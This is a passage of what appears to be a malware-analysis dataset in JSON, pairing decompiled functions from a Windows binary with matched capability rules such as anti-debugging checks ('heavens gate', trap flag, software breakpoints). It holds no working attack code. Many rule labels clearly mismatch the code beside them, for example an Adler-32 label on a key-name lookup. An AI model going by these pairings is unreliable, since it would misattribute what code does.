        "decompiled_code": "\nvoid fcn.00404878(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 53
    },
    "0041817c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041817c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4181f3;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00406570();\n    if (param_2 != 0) {\n        iVar2 = fcn.0041196c();\n        fcn.00406570(iVar2 + 5);\n        cVar1 = fcn.0040e14c();\n        if (cVar1 == '\\0') {\n            fcn.00406570();\n        }\n    }\n    fcn.00412158();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4181fa;\n    uStack24 = 0x4181f2;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 255
    },
    "0041c5d8": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041c5d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 52
    },
    "004509fc": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004509fc(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.00450884(&stack0xfffffffc);\n        fcn.00437d14();\n        cVar1 = fcn.00437e1c();\n        if (cVar1 == '\\0') {\n            fcn.00450918(arg_8h[3] + -2, &stack0xfffffffc);\n            fcn.00450918(arg_8h[3] + -2, &stack0xfffffffc);\n        }\n        else {\n            fcn.004509a0(arg_8h[3] + -2, *arg_8h + 10, &stack0xfffffffc);\n        }\n    }\n    else {\n        fcn.00450884(&stack0xfffffffc);\n        fcn.00437d14();\n        cVar1 = fcn.00437e1c();\n        if (cVar1 == '\\0') {\n            fcn.00450918(arg_8h[1] + 5, &stack0xfffffffc);\n            fcn.00450918(arg_8h[1] + 8, &stack0xfffffffc);\n        }\n        else {\n            fcn.004509a0(arg_8h[1] + 10, (arg_8h[2] - *(in_EAX + 0x18)) + -2, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "00405840": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.00405840(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00405840();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405810();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ddc();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 509
    },
    "00405a3c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.00405a3c(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.00402ee0();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.00404df4();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.004055bc();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.00405a24();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.00405b58(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00405a3c();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.00406588();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.00402ddc();\n                return;\n            }\n            fcn.00405ea0();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.00402ee0();\n    }\n    return;\n}\n",
        "token_count": 560
    },
    "00405b58": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __thiscall fcn.00405b58(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.00404df4();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.004055bc();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00405a24();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00405b58();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00405a3c();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00406588();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ddc();\n            return;\n        }\n        do {\n            fcn.00405ea0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00486ab8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00486ab8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iStack20;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x154) = puVar1;\n    *puVar1 = 0x4863c8;\n    if (param_2 == 0) {\n        iVar3 = (**(*(in_EAX + 4) + 4))();\n        piVar5 = puVar1 + 6;\n        iVar6 = 0;\n        do {\n            iVar4 = iVar6 + 1;\n            *piVar5 = iVar6 * 0x80 + iVar3;\n            piVar5 = piVar5 + 1;\n            iVar6 = iVar4;\n        } while (iVar4 < 10);\n        puVar1[0x10] = 0;\n    }\n    else {\n        iStack20 = 0;\n        iVar6 = *(in_EAX + 0x40);\n        puVar1 = puVar1 + 0x10;\n        for (; iStack20 < *(in_EAX + 0x38); iStack20 = iStack20 + 1) {\n            uVar2 = fcn.004837bc();\n            uVar2 = fcn.004837bc(uVar2);\n            uVar2 = (**(*(in_EAX + 4) + 0x14))(*(iVar6 + 0xc), uVar2);\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar6 = iVar6 + 0x54;\n        }\n    }\n    return;\n}\n",
        "token_count": 420
    },
    "0048953c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0048953c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *in_EDX - in_ECX;\n    if (iVar4 < 0) {\n        iVar4 = -iVar4;\n    }\n    iVar5 = 0;\n    for (; iVar4 != 0; iVar4 = iVar4 >> 1) {\n        iVar5 = iVar5 + 1;\n    }\n    if (0xb < iVar5) {\n        piVar1 = *(in_EAX + 0x20);\n        *(*piVar1 + 0x14) = 6;\n        (***piVar1)();\n    }\n    iVar4 = fcn.00489464();\n    if (iVar4 == 0) {\n        uVar2 = 0;\n    }\n    else if ((iVar5 == 0) || (iVar4 = fcn.00489464(),  iVar4 != 0)) {\n        var_10h = 1;\n        var_14h = 0x492260;\n        iVar4 = 0;\n        do {\n            iVar5 = in_EDX[*var_14h];\n            if (iVar5 == 0) {\n                iVar4 = iVar4 + 1;\n            }\n            else {\n                for (; 0xf < iVar4; iVar4 = iVar4 + -0x10) {\n                    iVar3 = fcn.00489464();\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                }\n                if (iVar5 < 0) {\n                    iVar5 = -iVar5;\n                }\n                iVar4 = 1;\n                while (iVar5 = iVar5 >> 1,  iVar5 != 0) {\n                    iVar4 = iVar4 + 1;\n                }\n                if (10 < iVar4) {\n                    piVar1 = *(in_EAX + 0x20);\n                    *(*piVar1 + 0x14) = 6;\n                    (***piVar1)();\n                }\n                iVar4 = fcn.00489464();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                iVar4 = fcn.00489464();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                iVar4 = 0;\n            }\n            var_10h = var_10h + 1;\n            var_14h = var_14h + 1;\n        } while (var_10h < 0x40);\n        if ((iVar4 < 1) || (iVar4 = fcn.00489464(),  iVar4 != 0)) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 712
    },
    "004898c8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004898c8(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int16_t *in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *in_EDX - in_ECX;\n    if (iVar2 < 0) {\n        iVar2 = -iVar2;\n    }\n    iVar3 = 0;\n    for (; iVar2 != 0; iVar2 = iVar2 >> 1) {\n        iVar3 = iVar3 + 1;\n    }\n    if (0xb < iVar3) {\n        *(*in_EAX + 0x14) = 6;\n        (***in_EAX)();\n    }\n    piVar1 = arg_ch + iVar3 * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = 0;\n    var_10h = 1;\n    var_14h = 0x492260;\n    do {\n        iVar3 = in_EDX[*var_14h];\n        if (iVar3 == 0) {\n            iVar2 = iVar2 + 1;\n        }\n        else {\n            for (; 0xf < iVar2; iVar2 = iVar2 + -0x10) {\n                arg_8h[0xf0] = arg_8h[0xf0] + 1;\n            }\n            if (iVar3 < 0) {\n                iVar3 = -iVar3;\n            }\n            iVar4 = 1;\n            while (iVar3 = iVar3 >> 1,  iVar3 != 0) {\n                iVar4 = iVar4 + 1;\n            }\n            if (10 < iVar4) {\n                *(*in_EAX + 0x14) = 6;\n                (***in_EAX)();\n            }\n            arg_8h[iVar4 + iVar2 * 0x10] = arg_8h[iVar4 + iVar2 * 0x10] + 1;\n            iVar2 = 0;\n        }\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 1;\n    } while (var_10h < 0x40);\n    if (0 < iVar2) {\n        *arg_8h = *arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 582
    },
    "0040c764": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040c764(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.00402ec0();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x490930))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040c5ac();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040c6a4(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "00448b84": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448b84(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar in_CL;\n    int32_t in_EDX;\n    uint var_5h;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x448baa\n    switch(in_CL) {\n    case 1:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 2:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 3:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 4:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa8))();\n    }\n    return uVar1;\n}\n",
        "token_count": 555
    },
    "0042074c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0042074c(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "0048f5d0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0048f5d0(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48f656;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x496500 == 0;\n    *0x496500 = *0x496500 + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion();\n        *0x4964fc = 3 < uVar1;\n        fcn.004529b0();\n        fcn.00414720();\n        fcn.004147c0();\n        fcn.0041476c();\n        fcn.0041476c();\n        fcn.0041476c();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 233
    },
    "0044f29c": {
        "rules": [
            "check for trap flag exception/d5d4160e77a5474aa5157e4631e4f1b3"
        ],
        "decompiled_code": "\nvoid fcn.0044f29c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x100;\n    fcn.0044b170();\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfeff;\n    return;\n}\n",
        "token_count": 91
    },
    "00439910": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: uCode\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00439910(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint uCode;\n    \n    uCode._0_1_ = in_AL;\n    fcn.00404da0();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(uCode, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.00405010();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00471758": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471758(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x47176d;\n    fcn.00472ea8();\n    uStack24 = 0x471862;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0044d1a4();\n    fcn.00446870(0);\n    fcn.00446870(0);\n    iVar2 = *(in_EAX + 0x294);\n    if (iVar2 == 0) {\n        iVar2 = *(in_EAX + 0x29c);\n        if (iVar2 == 0) {\n            iVar2 = *(in_EAX + 0x2a4);\n            if (iVar2 == 0) {\n                uVar1 = 0;\n                iVar2 = 0;\n            }\n            else {\n                uVar1 = *(iVar2 + 0x34);\n                iVar2 = *(iVar2 + 0x30);\n            }\n        }\n        else {\n            uVar1 = *(iVar2 + 0x34);\n            iVar2 = *(iVar2 + 0x30);\n        }\n    }\n    else {\n        uVar1 = *(iVar2 + 0x34);\n        iVar2 = *(iVar2 + 0x30);\n    }\n    fcn.00446870(uVar1 & 0xffff | iVar2 << 0x10);\n    if (param_2 < 1) {\n        param_2 = 1;\n    }\n    if (param_1 < 1) {\n        param_1 = 1;\n    }\n    uVar1 = param_2 & 0xffff | param_1 << 0x10;\n    fcn.00446870(uVar1);\n    *(in_EAX + 0x260) = param_2;\n    *(in_EAX + 0x264) = param_1;\n    *in_FS_OFFSET = uVar1;\n    fcn.00472eb0(0x471869);\n    return;\n}\n",
        "token_count": 533
    },
    "00478348": {
        "rules": [
            "check HTTP status code/09dd97b2e76544bcbbe79d95da398605"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00478348(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((in_EAX[5] != 200) && (in_EAX[5] != 0xc9)) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    iVar1 = fcn.004783b4();\n    if (iVar1 != 0) {\n        if (iVar1 == 1) {\n            iVar1 = 1;\n        }\n        else if (iVar1 == 2) {\n            if (param_2 != 0) {\n                *(*in_EAX + 0x14) = 0x33;\n                (***in_EAX)();\n            }\n            fcn.00483840();\n            iVar1 = 2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "004799e0": {
        "rules": [
            "check for software breakpoints/d1dd5f93455f4658aa4c6550878cfb7e"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.004799e0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint32_t uStack16;\n    \n    if (in_EAX[5] != 0xcd) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (in_EAX[0x23] < in_EAX[0x1d]) {\n        iVar1 = in_EAX[2];\n        if (iVar1 != 0) {\n            *(iVar1 + 4) = in_EAX[0x23];\n            *(iVar1 + 8) = in_EAX[0x1d];\n            (**in_EAX[2])();\n        }\n        uStack16 = 0;\n        (**(in_EAX[0x6a] + 4))(param_1);\n        in_EAX[0x23] = in_EAX[0x23];\n    }\n    else {\n        *(*in_EAX + 0x14) = 0x7b;\n        (**(*in_EAX + 4))();\n        uStack16 = param_1;\n    }\n    return uStack16 << 0x20;\n}\n",
        "token_count": 303
    },
    "00478830": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00478830(uint32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    var_14h = 0x3b9ac9f4 / (in_ECX << 7);\n    if (var_14h == 0) {\n        *(*in_EAX + 0x14) = 0x46;\n        (***in_EAX)();\n    }\n    if (arg_8h <= var_14h) {\n        var_14h = arg_8h;\n    }\n    *(iVar1 + 0x50) = var_14h;\n    iVar1 = fcn.0047858c();\n    var_18h = 0;\n    if (arg_8h != 0) {\n        do {\n            if (arg_8h - var_18h <= var_14h) {\n                var_14h = arg_8h - var_18h;\n            }\n            iVar2 = fcn.004786bc();\n            piVar3 = iVar1 + var_18h * 4;\n            for (uVar4 = var_14h; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *piVar3 = iVar2;\n                var_18h = var_18h + 1;\n                piVar3 = piVar3 + 1;\n                iVar2 = iVar2 + in_ECX * 0x80;\n            }\n        } while (var_18h < arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 436
    },
    "00487ce8": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00487ce8(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint8_t *puVar1;\n    int32_t in_ECX;\n    int32_t *piVar2;\n    int32_t in_EDX;\n    int32_t *piVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_11ch;\n    int32_t aiStack284 [63];\n    int16_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t *var_ch;\n    code *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = *(*(in_EAX + 0x164) + 8);\n    var_ch = *(*(in_EAX + 0x164) + 0xc + *(in_EDX + 0x10) * 4);\n    var_4h = in_ECX + arg_10h * 4;\n    var_10h = 0;\n    if (arg_8h != 0) {\n        do {\n            piVar3 = &var_11ch;\n            iVar5 = 0;\n            piVar2 = var_4h;\n            do {\n                iVar6 = *piVar2;\n                piVar2 = piVar2 + 1;\n                puVar1 = iVar6 + arg_ch;\n                iVar5 = iVar5 + 1;\n                *piVar3 = *puVar1 - 0x80;\n                piVar3[1] = puVar1[1] - 0x80;\n                piVar3[2] = puVar1[2] - 0x80;\n                piVar3[3] = puVar1[3] - 0x80;\n                piVar3[4] = puVar1[4] - 0x80;\n                piVar3[5] = puVar1[5] - 0x80;\n                piVar3[6] = puVar1[6] - 0x80;\n                piVar3[7] = puVar1[7] - 0x80;\n                piVar3 = piVar3 + 8;\n            } while (iVar5 < 8);\n            (*var_8h)();\n            var_1ch = var_10h * 0x80 + arg_14h;\n            var_14h = 0;\n            var_18h = &var_11ch;\n            piVar3 = var_ch;\n            do {\n                iVar5 = *piVar3;\n                iVar6 = *var_18h;\n                if (iVar6 < 0) {\n                    iVar6 = (iVar5 >> 1) - iVar6;\n                    if (iVar6 < iVar5) {\n                        iVar4 = 0;\n                    }\n                    else {\n                        iVar4 = iVar6 / iVar5;\n                    }\n                    iVar4 = -iVar4;\n                }\n                else {\n                    iVar6 = iVar6 + (iVar5 >> 1);\n                    if (iVar6 < iVar5) {\n                        iVar4 = 0;\n                    }\n                    else {\n                        iVar4 = iVar6 / iVar5;\n                    }\n                }\n                piVar3 = piVar3 + 1;\n                *var_1ch = iVar4;\n                var_14h = var_14h + 1;\n                var_1ch = var_1ch + 1;\n                var_18h = var_18h + 1;\n            } while (var_14h < 0x40);\n            var_10h = var_10h + 1;\n            arg_ch = arg_ch + 8;\n        } while (var_10h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 867
    },
    "00487e3c": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00487e3c(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    int32_t *piVar5;\n    int32_t in_EDX;\n    float *pfVar6;\n    int32_t iVar7;\n    float *pfVar8;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    float afStack280 [63];\n    int32_t var_18h;\n    float fStack24;\n    uint32_t var_10h;\n    float *var_ch;\n    code *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = *(*(in_EAX + 0x164) + 0x1c);\n    var_ch = *(*(in_EAX + 0x164) + 0x20 + *(in_EDX + 0x10) * 4);\n    var_4h = in_ECX + arg_10h * 4;\n    var_10h = 0;\n    if (arg_8h != 0) {\n        do {\n            pfVar6 = &var_118h;\n            iVar7 = 0;\n            piVar5 = var_4h;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n                puVar3 = iVar1 + arg_ch;\n                iVar7 = iVar7 + 1;\n                *pfVar6 = *puVar3 - 0x80;\n                pfVar6[1] = puVar3[1] - 0x80;\n                pfVar6[2] = puVar3[2] - 0x80;\n                pfVar6[3] = puVar3[3] - 0x80;\n                pfVar6[4] = puVar3[4] - 0x80;\n                pfVar6[5] = puVar3[5] - 0x80;\n                pfVar6[6] = puVar3[6] - 0x80;\n                pfVar6[7] = puVar3[7] - 0x80;\n                pfVar6 = pfVar6 + 8;\n            } while (iVar7 < 8);\n            (*var_8h)();\n            pfVar6 = &var_118h;\n            piVar4 = var_10h * 0x80 + arg_14h;\n            var_18h = 0;\n            pfVar8 = var_ch;\n            do {\n                fStack24 = *pfVar6 * *pfVar8;\n                iVar2 = fcn.00476c08();\n                pfVar8 = pfVar8 + 1;\n                *piVar4 = iVar2 + -0x4000;\n                piVar4 = piVar4 + 1;\n                var_18h = var_18h + 1;\n                pfVar6 = pfVar6 + 1;\n            } while (var_18h < 0x40);\n            var_10h = var_10h + 1;\n            arg_ch = arg_ch + 8;\n        } while (var_10h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 809
    },
    "00401548": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
